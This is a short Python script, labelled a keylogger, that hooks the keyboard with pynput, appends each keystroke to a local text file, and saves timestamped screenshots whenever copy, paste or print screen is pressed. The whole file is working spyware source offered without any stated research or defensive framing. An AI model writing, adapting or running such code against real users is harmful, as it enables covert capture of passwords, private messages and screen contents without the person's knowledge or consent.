from pynput.keyboard import Listener
import pyautogui
import datetime

# keyloger
def keystroke(key):
    key = str(key).replace("'","")
    if key == "\\x03":
        key = "\nshortcut Copy\n"
        capturekey("_Copy")
    if key == "\\x16":
        key = "\nshortcut Paste\n"
        capturekey("_Paste")
    if key == "Key.print_screen ":
        key = "\nprint screen\n"
        capturekey("_capture")
    if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
        key = ''
    else:
        key += ' '

    with open("Temp\\Keylogger.txt", 'a') as f:
        f.write(key)

# capture
def capturekey(k):
    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
    x += k
    pyautogui.screenshot().save('Temp\\Capture\\'+ x +'.jpg')

with Listener(on_press=keystroke) as l:
    l.join()
                    